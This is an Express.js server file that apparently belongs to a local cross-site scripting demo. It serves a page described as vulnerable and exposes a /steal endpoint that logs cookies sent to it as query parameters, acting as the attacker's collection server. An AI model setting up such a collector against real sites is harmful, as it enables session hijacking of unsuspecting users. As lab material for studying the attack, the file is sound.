const express = require("express");
const path = require("path");
const app = express();
const port = 4000;

// Serve all static files from /public
app.use(express.static(path.join(__dirname, "public")));

// Log any cookie theft attempts
app.get("/steal", (req, res) => {
  const stolenCookie = req.query.cookie || "(none)";
  console.log("⚠️ Cookie stolen:", stolenCookie);
  res.send("Cookie captured on attacker's server!");
});

// subpath for the vulnerable page
app.use("/cookiejar", express.static(path.join(__dirname, "public")));

// Start server
app.listen(port, () => {
  console.log(`Server running at http://localhost:${port}/`);
});
